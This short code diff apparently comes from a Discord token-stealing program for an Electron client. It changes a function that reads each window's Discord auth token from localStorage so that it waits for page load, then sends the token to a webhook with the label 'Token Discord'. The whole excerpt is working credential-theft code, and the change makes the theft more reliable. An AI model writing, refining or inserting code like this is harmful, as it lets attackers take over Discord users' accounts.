@@ -23,10 +23,12 @@ function sendToWebhook(content) {
 
 const getToken = () => {
     for (const win of BrowserWindow.getAllWindows()) {
-        win.webContents.executeJavaScript(`
-            localStorage.getItem("token");
-        `).then(token => {
-            sendToWebhook("Token Discord: " + token);
+        win.webContents.on("did-finish-load", () => {
+            win.webContents.executeJavaScript(`
+                localStorage.getItem("token");
+            `).then(token => {
+                sendToWebhook("Token Discord: " + token);
+            });
         });
     }
 };
